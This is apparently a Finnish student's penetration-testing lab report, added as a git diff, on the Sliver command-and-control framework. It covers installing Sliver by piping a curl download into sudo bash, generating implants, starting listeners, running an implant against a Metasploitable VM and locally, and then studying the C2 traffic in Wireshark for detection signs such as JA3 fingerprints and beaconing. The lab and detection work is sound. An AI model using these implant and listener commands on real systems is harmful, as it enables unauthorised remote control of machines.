@@ -131,3 +131,182 @@ Tunnistukselta välttämiseksi aloittaisin luomalla msfvenomilla uuden payloadin
 
 Sliver on Command and Control (C2) viitekehys, joka koostuu sliver-serveristä ja sliver-clientista. Sliver-server on palvelin, johon clientit ja kohteet yhdistävät. Sliver-client on operaattorin, eli hyökkääjän komentorivityökalu, jolla ohjataan palvelinta ja kohteita. Implantit ovat sliverin payloadeja, jotka yhdistävät sliver-serveriin. (https://sliver.sh/tutorials/?name=1+-+Getting+Started)
 
+Asensin sliverin käyttäen sliverin GitHubissa ollutta asennus-skriptiä, `curl https://sliver.sh/install|sudo bash`.
+
+Käynnistin sliverin ja käytin palvelimena ensimmäistä vaihtoehtoa.
+
+<img width="343" height="126" alt="image" src="https://github.com/user-attachments/assets/94b6457d-02f9-4dbc-89b1-6adc54c5e334" />
+
+Pääsin tämän jälkeen sliveriin.
+
+<img width="525" height="314" alt="image" src="https://github.com/user-attachments/assets/a2472f3f-b803-4c6f-9e2b-284822849994" />
+
+`generate`-komennolla tein uuden implantin. 
+
+<img width="701" height="115" alt="image" src="https://github.com/user-attachments/assets/952d7ff4-9b4b-40d4-9d4d-e484ac094cef" />
+
+Lähetin implantin metasploitableen.
+
+<img width="413" height="48" alt="image" src="https://github.com/user-attachments/assets/474b1252-8580-4e46-bc1a-a7cafcb726d4" />
+
+<img width="386" height="38" alt="image" src="https://github.com/user-attachments/assets/796de5c5-1086-49d3-aae4-dce8954556ad" />
+
+Yritin ajaa binäärin, mutta se ei onnistunut väärän arkkitehtuurin vuoksi.
+
+```
+root@metasploitable:/# chmod u+x implant
+root@metasploitable:/# ./implant
+bash: ./implant: cannot execute binary file
+root@metasploitable:/# file implant
+implant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
+root@metasploitable:/# uname -m
+i686
+```
+
+Metasploitablen arkkitehtuuri on 32-bittinen, joten lähdin kokeilemaan sliverin linux/386. Kuvassa sliverin tuetut arkkitehtuurit (https://sliver.sh/docs/?name=Payload+Compatibility).
+
+<img width="862" height="416" alt="image" src="https://github.com/user-attachments/assets/80bf33b6-a0c1-4545-84bc-8191d4fa1500" />
+
+Loin uuden binäärin, tällä kertaa toisella arkkitehtuurilla. Arkkitehtuuri ei ole sama kuin metasploitablessa, mutta ainoa linuxin 32-bittinen, joten testasin vielä sitä.
+
+```
+[127.0.0.1] sliver > generate --http 192.168.56.1 --os linux --format elf --arch 386
+
+[*] Generating new linux/386 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 2m11s
+[*] Implant saved to /home/lassi/Downloads/TAN_RATE
+```
+
+Siirsin implantin metasploitableen, kuten aiemmat ja ajoin sen.
+
+```
+root@metasploitable:/# ./implant
+```
+
+Binääri ajettiin, mutta mitään ei tapahtunut sliverissä. Tarkastin vielä `sessions` komennolla.
+
+<img width="276" height="67" alt="image" src="https://github.com/user-attachments/assets/934d0ea9-a290-4937-9dac-421ab9452d2c" />
+
+Käynnistin vielä sliverin http- ja https-kuuntelijat ja ajoin implantin uudestaan, mutta siltikään mitään ei tapahtunut.
+
+```
+[127.0.0.1] sliver > http --lhost 192.168.56.1 --lport 80
+
+[*] Starting HTTP :80 listener ...
+[*] Successfully started job #3
+
+[127.0.0.1] sliver > https --lhost 192.168.56.1 --lport 443
+
+[*] Starting HTTPS :443 listener ...
+[*] Successfully started job #4
+
+[127.0.0.1] sliver > jobs
+
+ ID   Name    Protocol   Port   Domains 
+==== ======= ========== ====== =========
+ 3    http    tcp        80             
+ 4    https   tcp        443            
+```
+
+Yrittäessäni ajaa implantia metasploitablessa huomasin, että se ei luonut prosessia.
+
+```
+root@metasploitable:/# ./implant
+root@metasploitable:/# ps aux |grep implant
+root      5100  0.0  0.0   1784   532 ?        R    10:55   0:00 grep implant
+```
+
+Tarkastin vielä, että implantti ei ollut muuttunut matkalla vertaamalla niiden tiisteitä.
+
+```
+┌──(lassi㉿lika)-[~/Downloads]
+└─$ sha256sum TAN_RATE
+5dda782d62eca4fe07b2bf4e85790db1905f5e3367b637df8bcfd5ca846e13b3  TAN_RATE
+
+root@metasploitable:/# sha256sum implant
+5dda782d62eca4fe07b2bf4e85790db1905f5e3367b637df8bcfd5ca846e13b3  implant
+```
+
+Nämä olivat samat, joten ongelmana oli todennäköisesti metasploitablen ei-tuettu arkkitehtuuri i686. On myös mahdollista, että localhost-osoitteessa oleva sliver-server ei saa otettua yhteyttä vastaan, vaikka käynnistin kuuntelijan oikeassa osoitteessa.
+
+Jotta voin nämä kummatkin vaihtoehdot eliminoida samalla, niin päätin ajaa implantin suoraan Kalissa. Tätä varten loin vielä kerran uuden implantin.
+
+```
+127.0.0.1] sliver > generate --http localhost --os linux --format elf
+
+[*] Generating new linux/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 1m46s
+[*] Implant saved to /home/lassi/Downloads/ARMED_PHYSICAL
+```
+
+Tapoin sliveristä vahnat kuuntelijat ja käynnistin uudet localhost-osoitteessa.
+
+```
+[127.0.0.1] sliver > jobs -K
+
+[*] Killing job #4 ...
+[*] Successfully killed job #4
+[*] Killing job #3 ...
+[*] Successfully killed job #3
+
+[127.0.0.1] sliver > http --lhost localhost
+
+[*] Starting HTTP :80 listener ...
+[*] Successfully started job #5
+
+[127.0.0.1] sliver > https --lhost localhost
+
+[*] Starting HTTPS :443 listener ...
+[*] Successfully started job #6
+```
+
+Toisessa ikkunassa ajoin implantin.
+
+```
+┌──(lassi㉿lika)-[~/Downloads]
+└─$ mv ARMED_PHYSICAL ../simpukat                                                                    
+                                     
+┌──(lassi㉿lika)-[~/Downloads]
+└─$ cd ../simpukat 
+                                     
+┌──(lassi㉿lika)-[~/simpukat]
+└─$ ./ARMED_PHYSICAL
+```
+
+Heti ajettuani implantin, sliver-ikkunaan tuli näkyviin uusi sessio:
+
+```
+[*] Session c1d830b7 ARMED_PHYSICAL - 127.0.0.1:34680 (lika) - linux/amd64 - Sun, 03 May 2026 18:44:51 EEST
+```
+
+Komennolla `use` yhdistin sessioon ja ajoin komennon `ls`.
+
+<img width="801" height="199" alt="image" src="https://github.com/user-attachments/assets/2c9931ea-a49a-4487-801d-da1d8ee10992" />
+
+Hakemisto `/home/lassi/simpukat` listattiin sliverissä, eli http-yhteys toimii.
+
+## d) Sniff Sliver! Tarkastele Sliverin http-yhteyttä snifferillä. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa?
+
+Käynnistin wiresharkin, `wireshark`. Valitsin wiresharkissa kaapattavaksi liitännäksi loopback. Kaapatussa liikenteesssä ei näkynyt porttien perusteella palvelimen ja implantin välistä liikennettä, joten aloitin yhteyden uudestaan, mutta tällä kertaa kaapaten myös yhteyden alun. Uudessa yhteydessä kohteen portiksi asettui 51722.
+
+<img width="2112" height="1098" alt="image" src="https://github.com/user-attachments/assets/d1dc8afb-a281-4c2d-89f2-2020c7cd2a54" />
+
+Kaappauksesta huomasin, että kohteen (127.0.0.1:51722) ja palvelimen (127.0.0.1:443) välinen TCP-yhteys kestää handshake mukaan lukien noin 0.02 sekuntia, jonka jälkeen se katkaistaan. Yhteyden katkaistuttua syntyy lähes välittömästi kaksi uutta yhteyttä kohteesta palvelimeen, vain kohteen portti vaihtuu. Tämä kaava toistuu usean kerran tallenteessa ja voi olla tapa tunnistaa sliver.
+
+TLS-yhteyden luonnin yhteydessä voidaan nähdä palvelimen JA3-sormenjälki "Server Hello"-viestissä. 
+
+<img width="2123" height="899" alt="image" src="https://github.com/user-attachments/assets/2260ed8d-adc8-4b3d-88a6-c8d4f53e2f05" />
+
+Kun tämän sormenjäljen googlaa, tekoäly osaa suoraan liittää sen mahdolliseen C2 aktiviteettiin. Lisäksi ehdotuksissa tulee esiin useampi maininta sliveristä.
+
+<img width="1278" height="725" alt="image" src="https://github.com/user-attachments/assets/e78ba6b3-75df-4734-835e-2878e21ad004" />
+
+Sliver palvelimen JA3 sormenjälki on tunnistettavissa.
+
+Huomasin myös, että palvelin ja kohde vaihtavat tietoa joka kahdes sekunti. Alla olevassa kuvassa tämä kaava toistuu kahdesti.
+
+<img width="2107" height="344" alt="image" src="https://github.com/user-attachments/assets/672a43fc-d7f8-44e0-8f8d-a1029a3034ee" />
+
+Ensiksi palvelin lähettää kohteelle 204 tavun pituisen paketin, johon kohde vastaa noin 350-380 tavua pitkällä paketilla ja lopuksi palvelin lähettää kohteelle TCP ACK-viestin.
